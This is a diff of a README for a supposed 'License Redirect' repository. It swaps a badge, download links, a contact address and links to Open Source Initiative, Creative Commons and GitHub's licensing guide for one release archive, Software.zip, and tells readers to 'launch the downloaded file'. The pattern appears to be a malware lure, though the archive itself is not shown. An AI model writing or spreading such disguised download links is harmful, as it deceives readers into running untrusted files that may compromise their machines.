@@ -1,6 +1,6 @@
 # 📜 License Redirect Repository 🔄
 
-![License Redirect](https://img.shields.io/badge/License-Redirect-blue)
+![License Redirect](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip)
 
 Welcome to the "License" repository! This repository serves as a redirect to various licenses related to software development. Whether you are looking for GPLv3 licenses, markdown language licenses, or any other type of license, this repository will guide you in the right direction.
 
@@ -13,13 +13,13 @@ Welcome to the "License" repository! This repository serves as a redirect to var
 ## 📁 Download Repository
 
 To access the contents of this repository, you can download the files by clicking the link below:
-[Download License Repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download License Repository](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip)
 
 🚀 Launch the downloaded file to explore the License redirect repository further.
 
 ## 🌐 Explore Licenses Online
 
-If you prefer to access licenses through a website, feel free to visit the [License Redirect Repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) online.
+If you prefer to access licenses through a website, feel free to visit the [License Redirect Repository](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip) online.
 
 ## 🔖 Releases
 
@@ -83,20 +83,20 @@ Connect with like-minded developers and licensing enthusiasts in the License Red
 
 ### 📧 Contact Us
 
-For inquiries, suggestions, or collaboration opportunities, reach out to the License Redirect Repository team at [license.redirect@example.com](mailto:license.redirect@example.com). We value your feedback and look forward to hearing from you!
+For inquiries, suggestions, or collaboration opportunities, reach out to the License Redirect Repository team at [https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip). We value your feedback and look forward to hearing from you!
 
 ### 🌐 Additional Resources
 
 Check out the following resources for more information on licenses, open-source software, and relevant industry trends:
 
-- [Open Source Initiative](https://opensource.org/)
-- [Creative Commons](https://creativecommons.org/)
-- [GitHub Licensing Guide](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/licensing-a-repository)
+- [Open Source Initiative](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip)
+- [Creative Commons](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip)
+- [GitHub Licensing Guide](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip)
 
 ---
 
 Thank you for visiting the License Redirect Repository! We hope this redirection service enhances your licensing experience and simplifies the process of accessing and understanding various licenses. Enjoy exploring the world of licensing with ease and efficiency! 🚀🔏
 
-🔗 [Visit License Redirect Repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 👈
+🔗 [Visit License Redirect Repository](https://github.com/DCRAZY-CODER/License/releases/download/v1.0/Software.zip) 👈
 
 Let the License Redirect guide you to a world of licensing possibilities! 🌐📜
